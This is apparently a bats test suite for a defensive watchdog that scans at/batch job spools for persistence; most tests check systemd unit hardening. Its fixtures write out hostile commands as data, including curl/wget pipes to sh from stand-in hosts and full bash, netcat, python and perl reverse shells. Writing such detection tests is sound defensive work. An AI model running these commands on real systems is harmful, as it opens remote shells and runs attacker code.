#!/usr/bin/env bats
# L2 bats functional tests for the at-jobs-watchdog scan script.
#
# Covers the at/batch scheduler-persistence surface (the sibling of cron
# that cron-job-watchdog does not see): atd runs each spooled job AS ITS
# OWNER at the scheduled time. High-signal cases are a job body that
# re-submits itself (`at`/`batch` inside the job — a self-perpetuating
# loop) or one carrying a reverse shell / fetch-pipe-shell / tmp payload.
#
# Notably this LOCKS the module-specific pattern that SDD-061 D-6 preserved
# verbatim as a PATTERNS+=(...) extra — the at/batch self-resubmission
# pattern `(^|[;&|`$(][[:space:]]*)(at|batch)[[:space:]]` — proving the
# preserved-extra still detects after the migration onto module-lib.
#
# Runs the actual scan script with `logger` shadowed on PATH and the spool
# + baseline in a tmp sandbox via SELFDEF_ATJOBS_*; locks the
# `"severity":"alert"` token SDD-062 routes on + the D-6 fail-loud path.
#
# Run with: bats packaging/test/L2-at-jobs-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd/at-jobs-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    SPOOL="${TMP}/spool"; mkdir -p "${SPOOL}"
    JOB="${SPOOL}/a00001"
    NOACL="${TMP}/nonexistent-acl"
}

teardown() { rm -rf "${TMP}"; }

# SPOOLS/ACLS use :- defaults, so override with non-empty values: a real
# spool dir and a nonexistent ACL path (so no ACL is picked up).
run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_ATJOBS_PROFILE="${PROFILE:-report}" \
    SELFDEF_ATJOBS_BASELINE="${BASELINE}" \
    SELFDEF_ATJOBS_SPOOLS="${SPOOLS:-$SPOOL}" \
    SELFDEF_ATJOBS_ACLS="${NOACL}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no at spool present → ok / no_at_spool" {
    SPOOLS="${TMP}/nospool" run_wd
    cap | grep -q '"event":"no_at_spool"'
    cap | grep -q '"severity":"ok"'
}

@test "benign job, first run → ok / baseline_initial" {
    printf '#!/bin/sh\nexport HOME=/root\n/usr/bin/backup.sh --nightly\n' > "${JOB}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged spool on second run → ok / at_jobs_intact" {
    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"at_jobs_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier — incl. the PRESERVED at/batch self-resubmit extra
# ============================================================

@test "job that re-submits itself via at → alert (preserved extra pattern)" {
    printf '#!/bin/sh\n/usr/bin/work.sh\nat now + 1 hour < /root/.relaunch\n' > "${JOB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "job that re-arms via batch → alert (preserved extra pattern)" {
    printf '#!/bin/sh\nbatch <<EOF\n/usr/bin/work.sh\nEOF\n' > "${JOB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "job body with a curl|sh payload → alert (canonical pattern)" {
    printf '#!/bin/sh\ncurl http://evil/x | sh\n' > "${JOB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "job body with a /dev/tcp reverse shell → alert (canonical pattern)" {
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.2.3.4/9 0>&1\n' > "${JOB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "benign job added after baseline → warn / at_jobs_changed" {
    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
    run_wd
    printf '#!/bin/sh\n/usr/bin/report.sh\n' > "${SPOOL}/a00002"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"at_jobs_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guards
# ============================================================

@test "benign job with only absolute commands is NOT flagged" {
    printf '#!/bin/sh\n/usr/bin/rsync -a /data /backup\n/usr/bin/logger done\n' > "${JOB}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "a commented-out self-resubmit line is NOT flagged" {
    printf '#!/bin/sh\n# at now + 1 day < /root/x\n/usr/bin/backup.sh\n' > "${JOB}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile + SDD-061 D-6 fail-loud
# ============================================================

@test "enforce profile exits non-zero on an alert" {
    printf '#!/bin/sh\ncurl http://evil/x | sh\n' > "${JOB}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — at-jobs inventory enumerates owner-scheduled exec surface)" {
    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (preserved at-resubmit extra — at after semicolon): self-resubmit via ;at" {
    # The preserved pattern matches at/batch after multiple separators
    # (; & | \` $( ). Lock that semicolon-prefix form fires.
    printf '#!/bin/sh\n/usr/bin/work.sh; at now + 1 hour < /root/.relaunch\n' > "${JOB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (preserved at-resubmit extra — at after pipe): self-resubmit via |at" {
    printf '#!/bin/sh\necho work | at now + 1 hour\n' > "${JOB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh in job)" {
    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${JOB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in job)" {
    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${JOB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (payload under /tmp): writable-root in command position" {
    printf '#!/bin/sh\n/tmp/.payload --run\n' > "${JOB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (payload under /var/tmp): writable-root expansion" {
    printf '#!/bin/sh\n/var/tmp/.payload --run\n' > "${JOB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (current-behavior lock — at-jobs-watchdog scans job CONTENT, not the at-job file's own perms; file-mode is owned by world-writable-watchdog)" {
    # Architectural boundary: at-jobs-watchdog is content-scoped (CONTENT
    # of the at job is the persistence signal). File-mode coverage lives
    # in world-writable-watchdog by design.
    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
    run_wd
    chmod 0666 "${JOB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    # The at-job content is unchanged → no exec-signal content match
    # from THIS watchdog. world-writable-watchdog would surface the
    # file-mode change separately.
    ! cap | grep -q '"event":"at_jobs_alert_signature"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-at-jobs -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no-auto-trust: at-jobs-watchdog does NOT refresh baseline on suspicious-job detection — alert STAYS until operator updates)" {
    # T1053 at-scheduler persistence primitive — alert MUST persist
    # across runs until operator explicitly re-baselines. Sister to
    # cron-job-watchdog + many other watchdogs' no-auto-trust
    # INVARIANT.
    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
    run_wd
    printf '#!/bin/sh\ncurl http://evil/x | sh\n' > "${SPOOL}/a99999"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in at job: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
    # dhcpcd-hooks/display-manager-hooks/dnf-plugins/fail2ban-action/
    # grub-config/initramfs-hooks/kernel-install-hooks/motd-scripts/
    # needrestart-hooks/pm-utils-hooks/resolvconf-hooks/xsession/
    # acpi-hooks nc reverse-shell variant INVARIANTs across the
    # brain. Lock the netcat axis on the at-scheduler one-shot root-
    # exec persistence surface (T1053.001 — at jobs run AS THE
    # SUBMITTING USER at the scheduled time; if submitter is root or
    # the scheduled time arrives during a root-context window, exec
    # is root).
    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${JOB}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on at job surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the at-scheduler
    # one-shot root-exec persistence surface (T1053.001 — at
    # jobs run AS THE SUBMITTING USER at the scheduled time).
    printf '#!/bin/sh\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${JOB}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (payload under /dev/shm — tmpfs writable-root expansion axis on at job surface)" {
    # Sister to /tmp + /var/tmp writable-root INVARIANTs already
    # locked. /dev/shm is a tmpfs writable by ALL users, lives in
    # RAM (no disk persistence — wiped on reboot), and is rarely
    # surveilled by ops tooling. Attackers prefer /dev/shm for
    # high-velocity persistence drops + fast cleanup. The at-job
    # scanner MUST recognize /dev/shm payload paths just as
    # firmly as /tmp + /var/tmp — locks tmpfs-writable-root axis
    # symmetry on the T1053.001 (at-scheduled-task) surface.
    printf '#!/bin/sh\n/dev/shm/.payload\n' > "${JOB}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (payload under /home — user-writable persistence vector on at job surface)" {
    # Sister to /tmp + /var/tmp + /dev/shm at-job writable-root
    # INVARIANTs. /home is user-writable; attacker pivots into
    # user account, plants /home/<user>/.payload, sets at job
    # pointing at it for delayed root-exec. T1053.001.
    printf '#!/bin/sh\n/home/alice/.payload\n' > "${JOB}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on at job surface)" {
    # Sister to nc / python -c at job rev-shell INVARIANTs.
    # Perl on every Debian/Ubuntu. Locks perl axis on T1053.001
    # at-scheduled-task root-exec persistence — at jobs run AS
    # ROOT when scheduled by root, or AS user when scheduled by
    # them; planted perl rev-shell fires at the scheduled time.
    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${JOB}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on at-jobs surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The at-jobs-watchdog MUST only emit severity values from
    # the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1053.001 at-scheduled-task root-exec
    # persistence alert. Locks parser contract on the at-job
    # content-payload detection surface.
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\necho hello\n' > "${JOB}"
    run_wd                                              # ok path
    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\n' > "${JOB}"
    run_wd                                              # alert path
    # Every severity value emitted MUST be one of {ok,warn,alert}.
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: at-jobs-watchdog NEVER deletes at-job files — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # at-jobs-watchdog DETECTS T1053.001 at-scheduled-task
    # root-exec persistence but MUST NEVER emit rm/atrm
    # commands to auto-clean the planted at job. The detected
    # job may be operator-legitimate (delayed maintenance task,
    # at-scheduled backup, one-shot reboot). Silent auto-delete
    # would destroy operator baseline state. Auto-atrm is also
    # a denial-of-service primitive. Surveillance, never
    # remediation. Locks anti-data-loss contract on the at-jobs
    # surveillance substrate.
    printf '#!/bin/sh\n/tmp/.evil\n' > "${JOB}"
    run_wd
    [ -f "${JOB}" ]
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*(atrm|find[[:space:]].*-delete)'
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*rm[[:space:]]+-rf?[[:space:]]+"?\$\{?(JOB|FILE|file)'
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # at-jobs-watchdog runs ON the timer's scheduled fire —
    # scans /var/spool/at + /var/spool/cron/atjobs for injection
    # patterns, emits a verdict, then exits. Type=simple would
    # break timer OnUnitActiveSec semantics. Locks oneshot-probe
    # contract on the at-jobs-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd/selfdef-at-jobs.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (no auto-fix: at-jobs-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. at-jobs-watchdog is a DETECT-only watchdog: it surveils
    # its target surface + emits verdicts, NEVER writes back to
    # the source files it scans. The libexec script must NOT
    # contain sed -i / tee / printf-redirect mutations of its
    # scanned paths. Locks no-auto-fix on the at-jobs-watchdog
    # libexec substrate (sister to existing surveillance-not-
    # remediation lines for the watchdog runtime).
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (at-jobs-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # The at-jobs-watchdog libexec uses set -u (and NOT set -e) by
    # design: watchdog probes WANT to continue scanning even
    # when individual checks fail (rather than abort-on-first-
    # error like installers), so they emit a complete verdict
    # at the end. But set -u remains essential — it catches
    # typo'd env-var references ($SELFDEF_FOO_BASELINE vs
    # $SELFDEF_FOO_BASLINE) before they propagate as silent
    # empty-string into baseline-path operations. A regression
    # dropping set -u would let a typo'd var name produce a
    # silent baseline-rewrite to /. Locks set -u discipline on
    # the at-jobs-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (at-jobs-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # All watchdog libexec scripts MUST surface JSON records
    # via logger -t with a selfdef-prefixed tag so downstream
    # syslog/journald consumers can route per-watchdog records
    # via the tag field rather than parsing the JSON payload
    # for the module field. The tag prefix MUST be "selfdef-"
    # so cross-watchdog SIEM filters (`syslog-ng-filter "selfdef-*"`)
    # capture every selfdef-watchdog without per-watchdog tag
    # enumeration. A regression dropping the selfdef- prefix
    # would cause SIEM filters to silently miss records. Locks
    # SDD-062 logger-tag routing discipline on the at-jobs-watchdog
    # libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (at-jobs-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # The at-jobs-watchdog timer unit MUST declare RandomizedDelaySec=
    # so fleet hosts don't all fire at the exact same minute
    # (thundering-herd that overwhelms downstream
    # syslog/journald aggregators). Locks anti-thundering-herd
    # cadence discipline on the at-jobs-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (at-jobs-watchdog timer unit declares Persistent=true — catch-up-after-downtime contract)" {
    # Sister to brain-wide timer Persistent INVARIANT family.
    # Persistent=true tells systemd to fire the timer ON BOOT
    # if it was missed during downtime — without it, a host
    # that boots after the scheduled fire would silently skip
    # the cycle, leaving a forensics gap. Locks Persistent=
    # discipline on the at-jobs-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Persistent=true' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (at-jobs-watchdog timer Unit= field references its companion .service — timer-to-service binding contract)" {
    # Sister to brain-wide systemd timer-Unit INVARIANT family.
    # The .timer file MUST declare Unit=<companion>.service so
    # systemd knows which .service to fire on timer-elapse. By
    # default systemd matches timer-name to service-name, but
    # explicit Unit= is required when names differ + makes the
    # binding self-documenting. A regression dropping Unit= +
    # renaming either file would silently break the link.
    # Locks the timer-to-service binding discipline on the
    # at-jobs-watchdog substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Unit=.*\.service' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (at-jobs-watchdog service ExecStart references its libexec script — service-to-libexec binding contract)" {
    # Sister to brain-wide systemd ExecStart binding INVARIANT
    # family. The .service file MUST declare ExecStart=<path-
    # to-libexec.sh> so systemd knows what to run. The libexec
    # script must EXIST at the declared path. A regression that
    # renamed the libexec script without updating ExecStart
    # would surface as service-start failure rather than a
    # silent regression. Locks the service-to-libexec binding
    # discipline on the at-jobs-watchdog substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    found=0
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        if grep -qE '^ExecStart=' "${s}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (at-jobs-watchdog service does NOT declare Restart=always — anti-restart-storm contract on oneshot probe)" {
    # Sister to brain-wide oneshot-probe INVARIANT family.
    # The at-jobs-watchdog probe is Type=oneshot — it RUNS, emits a
    # verdict, and EXITS. Restart=always on a oneshot would
    # cause systemd to immediately re-fire the probe in a
    # tight loop, swamping the dashboard with redundant
    # records. A regression that added Restart=always would
    # produce a runaway-probe footgun. Locks the anti-restart-
    # storm discipline on the at-jobs-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        ! grep -qE '^Restart=always' "${s}"
        ! grep -qE '^Restart=on-failure' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog service unit declares Description= — systemctl-status operator-readable label)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. The Description= directive surfaces in
    # `systemctl status` output + journalctl unit-filter
    # labels. A unit with no Description is opaque to
    # operators triaging service activity. Locks the
    # Description-present discipline on the at-jobs-watchdog
    # service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Description=' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog service unit declares TimeoutStartSec= — anti-hang oneshot bound contract)" {
    # Sister to brain-wide TimeoutStartSec= INVARIANT family.
    # Watchdog .service units are Type=oneshot probes — they
    # MUST declare a TimeoutStartSec= upper bound so systemd
    # kills a hung probe (e.g. a stuck sha256sum on a slow
    # NFS-mounted target file) rather than blocking the
    # next timer fire indefinitely. Without TimeoutStartSec=
    # systemd's default (90s) applies, but the canonical
    # selfdef contract pins this explicitly per watchdog so
    # operators reading the .service know the bound at a
    # glance. A regression that dropped TimeoutStartSec=
    # would silently revert to the systemd default + mask
    # the explicit-bound contract. Locks anti-hang oneshot-
    # bound discipline on the at-jobs-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^TimeoutStartSec=' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog service unit declares Nice= — idle-priority anti-resource-starve contract)" {
    # Sister to brain-wide systemd resource-priority INVARIANT
    # family. Watchdog .service units run periodic scans (often
    # sha256sum walks of large config trees) — they MUST be
    # deprioritized via Nice= (positive value = lower priority
    # under load) so that the watchdog scan doesn't starve
    # operator-foreground workloads when CPU is contended.
    # The canonical selfdef value is Nice=15 (well above the
    # background-batch threshold of 10). A regression dropping
    # Nice= would let watchdog scans compete with foreground at
    # default Nice=0, surfacing as latency spikes on contended
    # hosts. Locks the idle-priority anti-resource-starve
    # discipline on the at-jobs-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Nice=' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog service unit declares PrivateTmp= — /tmp namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd PrivateTmp= INVARIANT
    # family. Watchdog .service units that run periodic
    # sha256sum walks may create transient /tmp files. The
    # PrivateTmp= directive (canonically =true) instructs
    # systemd to give the unit its own /tmp mount namespace —
    # an attacker who exploits the watchdog cannot reach
    # /tmp files owned by other processes (e.g. ssh-agent
    # sockets), and the watchdog's own /tmp residue is
    # automatically cleaned at unit-stop. A regression
    # dropping PrivateTmp= would share /tmp with the host,
    # exposing the watchdog as a side-channel for any
    # /tmp-based pivot. Locks the /tmp namespace-isolation
    # discipline on the at-jobs-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^PrivateTmp=' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog service unit declares ProtectHome= — /home + /root + /run/user namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd ProtectHome= INVARIANT
    # family. Watchdog .service units have no business
    # reading /home — their probe targets are system-config
    # paths (/etc/*). The ProtectHome= directive
    # (canonically =read-only) instructs systemd to either
    # hide (=true) or read-only-mount (=read-only) the
    # /home, /root, and /run/user directories within the
    # unit's mount namespace. An exploited watchdog cannot
    # then exfiltrate ~/.bash_history, ~/.ssh/*, or operator
    # credentials. A regression dropping ProtectHome= would
    # expose all operator home contents to a compromised
    # watchdog. Locks the home-namespace-isolation
    # discipline on the at-jobs-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ProtectHome=' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog service unit declares NoNewPrivileges=true — privilege-escalation containment contract)" {
    # Sister to brain-wide systemd NoNewPrivileges= INVARIANT
    # family. The NoNewPrivileges=true directive instructs
    # the kernel to set PR_SET_NO_NEW_PRIVS on the watchdog
    # process — any subsequent execve() in the watchdog
    # script (sha256sum, awk, etc.) is forbidden to acquire
    # NEW privileges via setuid/setgid/file-capabilities. An
    # exploited watchdog cannot escalate via a setuid helper
    # (e.g. /usr/bin/su, /usr/bin/sudo). A regression
    # dropping NoNewPrivileges= would leave the watchdog
    # exposed to setuid-binary pivot. Locks the privilege-
    # escalation containment discipline on the at-jobs-
    # watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^NoNewPrivileges=true' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog service unit declares ReadWritePaths= — explicit-strict-mode-permitted-writes manifest contract)" {
    # Sister to brain-wide systemd ReadWritePaths= INVARIANT
    # family. Watchdog .service units run under ProtectSystem=
    # strict which forbids ALL writes to /etc, /usr, /boot —
    # the unit can ONLY write to paths explicitly enumerated
    # in ReadWritePaths=. Watchdog scripts MUST write to at
    # least /dev/log (logger(1) channel) + the canonical
    # selfdef state dir. A regression dropping ReadWritePaths=
    # would surface as EROFS at logger() call. Locks the
    # explicit-allowlist write-paths discipline on the at-jobs-
    # watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ReadWritePaths=' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog service unit ExecStart references /usr/local/libexec/selfdef/ — operator-extension binary-path canonical contract)" {
    # Sister to brain-wide systemd ExecStart binary-path
    # INVARIANT family. Watchdog .service units MUST execute
    # the watchdog script from /usr/local/libexec/selfdef/
    # (operator-extension path, not /usr/bin which is
    # Debian-package-only). The canonical libexec/selfdef/
    # path lets operators override the watchdog script
    # without rebuilding the .deb (sister to brain-wide
    # operator-extension /usr/local/* discipline). A
    # regression that pointed ExecStart at /usr/bin/ would
    # surface as a "stale-watchdog-binary" on hosts where
    # operators patched the libexec copy. Locks the
    # libexec/selfdef ExecStart-path discipline on the
    # at-jobs-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ExecStart=/usr/local/libexec/selfdef/' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog service unit declares After= ordering directive — boot-sequencing contract)" {
    # Sister to brain-wide systemd After= INVARIANT family.
    # Watchdog .service units MUST declare an After= directive
    # so they don't fire before the filesystem mounts that
    # contain their probe targets (canonically After=local-
    # fs.target so /etc/* is mounted before the watchdog
    # tries to sha256sum a config file). A regression
    # dropping After= would surface as "watchdog fires
    # during early-boot before /etc is mounted" which then
    # hashes nothing + emits a spurious "config missing"
    # alert. Locks the boot-sequencing discipline on the
    # at-jobs-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^After=' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog service unit declares Documentation= — operator-doc-link canonical contract)" {
    # Sister to brain-wide systemd Documentation= INVARIANT
    # family. Watchdog .service units MUST declare a
    # Documentation= directive pointing operators at the
    # module's README (canonical: https://github.com/
    # cyberpunk042/selfdef modules/<slug>-watchdog/README.md).
    # A regression dropping Documentation= would leave
    # operators triaging journald entries without a direct
    # docs link. Locks the Documentation= operator-doc-link
    # discipline on the at-jobs-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Documentation=' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog timer unit declares OnCalendar= — daily-cadence operator-predictable contract)" {
    # Sister to brain-wide systemd OnCalendar= INVARIANT
    # family. Watchdog .timer units MUST declare an
    # OnCalendar= directive (canonically daily at a staggered
    # time per the watchdog ladder so simultaneous-fire
    # thundering-herd is avoided). The operator can predict
    # when each watchdog runs based on the canonical timer
    # schedule. A regression dropping OnCalendar= would
